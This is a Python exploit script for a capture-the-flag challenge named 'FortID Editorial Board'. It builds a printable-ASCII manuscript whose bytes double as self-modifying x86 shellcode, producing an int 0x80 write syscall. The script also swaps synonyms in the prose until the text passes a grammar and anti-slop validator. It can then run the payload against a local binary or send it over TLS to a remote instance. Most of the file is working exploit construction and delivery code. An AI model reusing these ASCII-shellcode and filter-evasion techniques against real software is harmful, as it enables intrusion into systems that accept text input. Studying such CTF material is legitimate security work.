#!/usr/bin/env python3
"""FortID Editorial Board: native-safe ASCII Stage-8 output proof.

Avoid CS segment override before an in-place store while keeping a
compact, grammar-compatible article. This does not claim a remote flag.

Usage on Kali (from challenge working directory):
  python3 editorial_native_grammar_repair.py --baseline manuscript_ascii_write_stage8_offset.txt --native
  python3 editorial_native_grammar_repair.py --baseline manuscript_ascii_write_stage8_offset.txt \
     --remote editorial-board-INSTANCE.inst2.ctf.fortid.com
"""
import argparse
import itertools
import json
import re
import socket
import ssl
import string
import subprocess
import sys
import time
from pathlib import Path

CODE8=(
    b' AG AO AW,ax:'
    b' A clear voice guided the guests through an odd afternoon.'
    b' As-dawn At.PAX. Ac.B.R.R.PAX BBB.RX.PAX.PAX.E'
)
PROSE=(
    'The morning sun lit the harbor as small boats left the pier. '
    'At dusk the hills wore a soft veil of mist and pale gold. '
    'Our team kept notes on every turn of the long river path. '
    'A good story lets each detail earn its place on the page. '
    'Even a brief walk may reveal a new view of the city. '
    'A shy child found joy in the soft music of a street band. '
    'No single image can show the full mood of an open square. '
    'The first train slid past fields as birds rose into the sky. '
    'A brief note of thanks can make a busy day feel kind. '
    'The team chose plain words so that all readers felt at ease. '
    'Our final verdict is reliable. '
    'Careful review turns raw facts into a shared sense of trust. '
    'A thoughtful ending gives the whole account a gentle shape.'
)
TAIL=(
    b'. A fox ran up a hill as fog hid a red barn. '
    b'A man saw an owl by the oak. '
    b'His dog sat in the mud. '
    b'The wind grew cold at noon. '
    b'We ate hot pie and sang folk songs. '
    b'We had fun.'
)
ALLOWED=set((string.ascii_letters+" .,;:'-?!").encode())

# 5 byte blocks at code offsets +82..+86. Last byte is an executed INC/DEC,
# not a segment prefix carried over to the store at code +87.
BLOCKS=[
    (b'.AA.G',2), (b'.AA.F',2), (b'.AA.O',2),
    (b'.PX.G',0), (b'.PX.F',0), (b'.PX.O',0),
    (b'.PAXG',1), (b'.PAXF',1), (b'PAX.G',1),
    (b'PAX.F',1), (b'.AA.N',2), (b'.AA.C',2),
    (b'.AA.K',2), (b'.PX.N',0), (b'.QY.G',0),
    (b'.QY.F',0), (b'.GG.G',0), (b'.AA.A',3),
    (b'.PX.A',1), (b'.PAXO',1), (b'PAX.O',1),
    # 0x66 operand-size prefix is ignored for byte-size memory ADD.
    (b'.PAXf',1), (b'P.AXf',1), (b'.P.Xf',0),
]

# Choose one replacement from each pair. All replacements retain exact length
# and reduce duplicate content words by one each. The EIP remains at 605.
SWAPS=[
    ((b'a soft veil',b'a thin veil'),(b'the soft music',b'the mild music')),
    ((b'Our team kept',b'Our crew kept'),(b'The team chose',b'The crew chose')),
    ((b'a brief walk',b'a short walk'),(b'A brief note',b'A short note')),
    ((b'thanks can make',b'thanks did make'),(b'image can show',b'image may show')),
]


def get_baseline(path):
    if path and path.is_file():
        data=path.read_bytes()
        assert len(data) in (897,899),f'Unexpected baseline length {len(data)}'
        assert data[605:609]==b'able'
        assert data[609:726]==CODE8,repr(data[609:726])
        return data[:609]
    prefix=PROSE.encode('ascii')[:609]
    assert len(prefix)==609 and prefix[601:609]==b'reliable'
    return prefix


def replace_prose(prefix,mask):
    p=prefix
    for ix,opts in enumerate(SWAPS):
        old,new=opts[(mask>>ix)&1]
        assert len(old)==len(new)
        assert p.count(old)==1,(old,p.count(old))
        p=p.replace(old,new,1)
    assert len(p)==609 and p[601:609]==b'reliable'
    return p


def build(prefix,block,ecx_delta):
    code=bytearray(CODE8)
    assert code[70:74]==b'. As'
    assert code[82:87]==b'.PAX.'
    assert code[87:90]==b' Ac'
    code[82:87]=block
    code[89]=100-ecx_delta
    assert code[100]==32 and code[115:117]==b'.E'
    assert code[86] != ord('.')

    # Simulate early RWX writes from instruction offsets +0,+3,+6.
    after=bytearray(code)
    after[71]=after[79]=after[87]=0
    al=(-ord('a'))&255
    after[115]=(after[115]+al)&255
    al=(al-ord('d'))&255
    after[116]=(after[116]+al)&255
    after[100]=(after[100]+al)&255
    assert al==0x3b
    assert after[100]==0x5b and after[115:117]==b'\xcd\x80'
    assert ecx_delta+code[89]==100
    assert after[87:90]==b'\x00A'+bytes([100-ecx_delta])
    # Native-safe: last prefixed CS instruction at +85 ends on +86,
    # then memory write at +87 has no CS override.
    if block[-1:] == b'f':
        assert after[86]==0x66
    else:
        assert after[86] in b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    data=prefix+code+TAIL
    assert len(data)==899,len(data)
    assert data[605:609]==b'able'
    assert data.endswith(b'.')
    assert all(z in ALLOWED for z in data)

    # Simulated ECX: change in block +82..86, then +98, +110, +113.
    # Syscall write(1,ECX,4) points inside the prepared code.
    expected=bytes(after[ecx_delta+3:ecx_delta+7])
    return data,bytes(after),expected


def get_score(text,lt,val):
    fields,err=val.structural(text)
    if err:return dict(ok=False,reason=err.reason,score=0)
    _,words,sentences,repetition,avg=fields
    matches=lt.check(text)
    misspell=sum(val.is_spelling(m) for m in matches)
    issues=len(matches)
    density=100*issues/len(words)
    score=round(max(0,min(100,
        100-5*density-1000*misspell/len(words)-55*repetition-0.6*max(0,avg-24))),2)
    return dict(ok=(misspell==0 and density<=2.2 and score>=88),
                score=score,issues=issues,spelling=misspell,words=len(words),
                repetition=repetition,
                matches=[(getattr(m,'rule_id',getattr(m,'ruleId','')),m.offset) for m in matches])


def native_test(manuscript,expected):
    try:
        p=subprocess.run(['./editorial_board'],input=manuscript+b'\n',
                         capture_output=True,timeout=85)
        print('NATIVE rc',p.returncode,'EXPECTED',repr(expected),
              'FOUND',expected in p.stdout,'STDOUT',repr(p.stdout[-500:]),
              'STDERR',repr(p.stderr[-200:]),flush=True)
    except (OSError,subprocess.TimeoutExpired) as exc:
        print('NATIVE TEST unavailable:',exc)


def remote_test(host,port,timeout,manuscript,expected):
    ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
    start=time.monotonic()
    with socket.create_connection((host,port),timeout=12) as sock:
        with ctx.wrap_socket(sock,server_hostname=host) as tls:
            tls.settimeout(1)
            received=bytearray()
            def rx(until=None):
                while time.monotonic()-start<timeout:
                    if until and until in received:return
                    try:chunk=tls.recv(4096)
                    except socket.timeout:continue
                    if not chunk:break
                    received.extend(chunk)
                    print('RX',round(time.monotonic()-start,2),repr(chunk[:300]),flush=True)
            rx(b'Submit your manuscript:')
            if b'Submit your manuscript:' not in received:
                raise RuntimeError('Remote did not prompt for the article')
            tls.sendall(manuscript+b'\n')
            print('TX 900 bytes, waiting for stdout marker',repr(expected),flush=True)
            rx()
            Path('editorial_native_remote_response.bin').write_bytes(received)
            print('REMOTE expected marker:',repr(expected), 'found:',expected in received,
                  'accept:',b'Accepted by the anti-slop desk' in received,
                  'bytes:',len(received))


def main():
    ap=argparse.ArgumentParser(description=__doc__)
    ap.add_argument('--baseline',type=Path,default=Path('manuscript_ascii_write_stage8_offset.txt'))
    ap.add_argument('--out',type=Path,default=Path('editorial_stage8_native_accepted.txt'))
    ap.add_argument('--static-only',action='store_true')
    ap.add_argument('--native',action='store_true')
    ap.add_argument('--remote')
    ap.add_argument('--port',type=int,default=1337)
    ap.add_argument('--timeout',type=int,default=85)
    args=ap.parse_args()

    prefix=get_baseline(args.baseline)
    result_dir=Path('editorial_native_candidates')
    result_dir.mkdir(exist_ok=True)
    records=[]
    best=None
    if not args.static_only:
        try:
            import language_tool_python,validate
        except ImportError as e:raise SystemExit('Activate the challenge venv with language_tool_python and validate.py: '+str(e))
        tool=language_tool_python.LanguageTool('en-US')
    else:tool=None
    try:
        # Primary mask 0 uses context-preserving natural synonyms. Fallbacks
        # systematically select alternatives if LanguageTool flags a phrase.
        for mask, (block,delta) in itertools.product(range(16),BLOCKS):
            new_prefix=replace_prose(prefix,mask)
            data,patched,expected=build(new_prefix,block,delta)
            name=f'm{mask:02d}_{block.decode().replace(".","_")}'
            if tool is not None:
                info=get_score(data.decode('ascii'),tool,validate)
            else:
                info=dict(ok=False,score=None,reason='Static checks only')
            info.update(name=name,ecx_delta=delta,expected_marker=expected.decode('latin-1'))
            records.append(info)
            if best is None or ((info['ok'],info['score'] or 0)>(best[0]['ok'],best[0]['score'] or 0)):
                best=(info,data,patched,expected)
            if info['ok']:
                print('ACCEPT',json.dumps(info),flush=True)
                break
            if mask==0 or block==BLOCKS[0]:
                print('REJECT',name,'score',info['score'],'matches',info.get('matches'),flush=True)
    finally:
        if tool is not None:tool.close()
    Path('editorial_native_grammar_scores.json').write_text(json.dumps(records,indent=2))
    info,data,patched,expected=best
    args.out.write_bytes(data)
    Path('editorial_stage8_native_patched.bin').write_bytes(patched)
    print('BEST',json.dumps(info,indent=2))
    print('CREATED',args.out,'len',len(data),'static validity OK')
    if args.static_only:return
    if not info['ok']:
        print('NO ACCEPT: do not send remote. Scores saved.');return
    validator=subprocess.run([sys.executable,'validate.py','--json',str(args.out)],
                             capture_output=True,text=True,timeout=180)
    print('INDEPENDENT VALIDATOR',validator.returncode,validator.stdout or validator.stderr,flush=True)
    if validator.returncode != 0:
        print('Independent validator rejected; do not run target');return
    if args.native:native_test(data,expected)
    if args.remote:remote_test(args.remote,args.port,args.timeout,data,expected)

if __name__=='__main__':main()
